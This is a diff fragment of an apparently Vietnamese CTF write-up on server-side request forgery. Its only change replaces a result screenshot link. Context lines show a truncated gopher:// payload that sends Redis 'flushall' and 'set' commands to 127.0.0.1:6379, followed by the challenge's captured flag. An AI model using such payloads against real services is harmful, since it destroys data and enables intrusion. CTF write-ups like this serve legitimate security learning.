@@ -88,7 +88,7 @@ gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0As
 
 Kết quả:
 
-![image](https://user-images.githubusercontent.com/92881216/229144082-ebaca7a9-c608-4595-aa4e-78d2be02f7b6.png)
+![image](https://user-images.githubusercontent.com/92881216/229145504-1a9492a0-82f7-4796-a56f-1944aa8aaa0a.png)
 
 > `SSRF_PwNiNg_v1@_GoPh3r_1s_$o_c00l!`
 
